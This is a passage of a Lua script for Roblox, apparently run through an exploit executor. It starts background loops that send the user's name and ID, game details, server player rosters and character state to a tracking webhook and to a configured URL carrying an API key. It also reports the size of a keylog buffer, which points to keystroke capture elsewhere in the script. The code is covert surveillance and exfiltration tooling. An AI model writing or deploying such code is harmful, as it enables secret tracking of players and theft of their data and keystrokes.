end

if CONFIG.track.enabled and trackAlive then
    previousRoster = currentRosterMap()
    task.spawn(function()
        local c = clockNow()
        postTrack(table.concat({
            "**▶ session started · "..PLATFORM.."** · `"..SESSION.."`",
            "**executor** `"..IDENT.."`",
            "**user** `"..LP.Name.."` (`"..LP.UserId.."`)",
            "**at** "..c.localTime.." ("..c.tz..")",
            "**game** "..game.Name.." · place `"..game.PlaceId.."`",
        }, "\n"))
    end)

    task.spawn(function()
        local pings = 0
        while true do
            task.wait(CONFIG.track.interval)
            pings = pings + 1
            if CONFIG.track.maxPings > 0 and pings > CONFIG.track.maxPings then break end
            local c = clockNow()
            local curRoster = currentRosterMap()
            local joined, left = diffRoster(previousRoster, curRoster)
            previousRoster = curRoster
            local state = CONFIG.track.includeState and grabPlayerState() or {}
            local lines = {
                "**💓 live** · `"..SESSION.."` · uptime "..elapsedStr().." · ping #"..pings,
                "**clock** "..c.localTime.." ("..c.tz.." UTC"..c.offset..")",
                "**game** "..game.Name.." · place `"..game.PlaceId.."`",
                "**server** "..tostring(#Players:GetPlayers()).."/"..tostring(Players.MaxPlayers),
            }
            if state.inGame then
                local hp = (state.health and state.maxHealth) and string.format("%.0f/%.0f", state.health, state.maxHealth) or "?"
                lines[#lines+1] = "**state** in-game · HP "..hp
            else
                lines[#lines+1] = "**state** menu / no character"
            end
            if CONFIG.track.diffRoster then
                if #joined > 0 then lines[#lines+1] = "**+ joined** `"..table.concat(joined, "`, `"):sub(1,300).."`" end
                if #left > 0 then lines[#lines+1] = "**− left** `"..table.concat(left, "`, `"):sub(1,300).."`" end
            end
            if CONFIG.track.includeBuffer then
                lines[#lines+1] = "**keylog** buffer "..#KeyLog.buffer.." · dropped "..KeyLog.dropped
            end
            if CONFIG.trackUrl and CONFIG.trackUrl ~= "" then
                task.spawn(function()
                    hit({ Url=CONFIG.trackUrl, Method="POST",
                        Headers={["Content-Type"]="application/json",["X-Api-Key"]=CONFIG.sinkKey},
                        Body=encode({ session=SESSION, userId=LP.UserId, userName=LP.Name,
                            platform=PLATFORM, executor=IDENT, ping=pings, uptimeSec=os.clock()-SESSION_START,
                            clock=c, state=state, roster=curRoster, joined=joined, left=left,
                            bufferSize=#KeyLog.buffer, dropped=KeyLog.dropped }) })
                end)
            end
            postTrack(table.concat(lines, "\n"))
        end
    end)

    pcall(function()
        game:BindToClose(function()
            local c = clockNow()
            postTrack("**⏹ session ended** · `"..SESSION.."` · uptime "..elapsedStr().." · "..c.localTime)
        end)
    end)
    log("track","[ok] every "..CONFIG.track.interval.."s")
end

